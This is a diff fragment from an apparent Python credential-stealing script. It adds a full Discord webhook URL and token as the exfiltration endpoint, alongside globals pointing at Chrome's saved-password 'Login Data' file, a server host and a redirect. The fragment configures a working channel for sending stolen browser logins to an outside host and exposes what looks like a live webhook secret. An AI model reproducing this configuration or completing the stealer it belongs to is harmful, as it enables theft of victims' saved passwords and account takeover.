@@ -13,7 +13,7 @@ from string import ascii_uppercase                                              
 
 # Global variables
 
-WEBHOOK 	= 	'' 									# Discord webhook URL
+WEBHOOK 	= 	'https://discord.com/api/webhooks/1439354104068571248/SiDSBzeY9fLRZRVvZNCDjTMPn8L_xRD_4VelMFJlJ3dlWqybpyJTr2kpD0gfDukL902v' 									# Discord webhook URL
 REDIRECT 	= 	'' 									# Optional redirect to website
 HOST	 	= 	'' 									# Server host URL (e.g: http://127.0.0.1/)
 CHROME_DATA =	'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'	# Chrome login data path
